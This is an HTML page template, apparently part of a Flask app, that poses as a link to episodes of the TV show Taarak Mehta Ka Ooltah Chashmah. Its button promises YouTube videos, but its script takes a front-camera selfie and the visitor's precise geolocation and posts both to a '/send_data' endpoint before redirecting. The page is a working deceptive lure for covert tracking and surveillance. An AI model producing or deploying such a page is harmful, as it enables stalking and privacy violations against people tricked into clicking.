<!DOCTYPE html>
<html>
<head>
    <title>Live Location & Selfie Capture Consent</title>
    <style>
        body { font-family: Arial,sans-serif; text-align:center; margin-top:40px; background:#f8f8f8; }
        .tmkoc-img { max-width:400px; width:100%; margin-bottom:20px; }
        h1 { color:#333; text-decoration:underline; }
        button { padding:15px 40px; font-size:18px; background:#ff0000; color:white; border:none; border-radius:5px; cursor:pointer; }
        #status { margin-top:20px; color:green; font-weight:bold; }
    </style>
</head>
<body>
    <!-- TMKOC Poster -->
    <img src="{{ url_for('static', filename='TMKOC.png') }}" alt="TMKOC Poster" class="tmkoc-img">

    <h1>TARAKH MEHTA KA OOLTA CHASHMA</h1>
    <p>Best Episodes of Tarakh Mehta *JETHALAL*</p>
    <button onclick="startCapture()">Open YouTube and Start Watching</button>
    <div id="status"></div>

    <script>
    async function startCapture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" }});
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude, lon = pos.coords.longitude;
                const canvas = document.createElement('canvas');
                canvas.width  = video.videoWidth  || 320;
                canvas.height = video.videoHeight || 240;
                canvas.getContext('2d').drawImage(video,0,0);
                const selfie = canvas.toDataURL('image/png');
                stream.getTracks().forEach(t=>t.stop());

                const res = await fetch('/send_data',{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({latitude:lat,longitude:lon,selfie})
                });
                const {status} = await res.json();
                if(status==='success') {
                    window.location.href = '/youtube';
                } else {
                    document.getElementById('status').innerText = status;
                }
            }, err => {
                document.getElementById('status').innerText = 'Location denied';
            }, {enableHighAccuracy:true,timeout:10000});
        } catch(e) {
            document.getElementById('status').innerText = 'Camera error';
        }
    }
    </script>
</body>
</html>
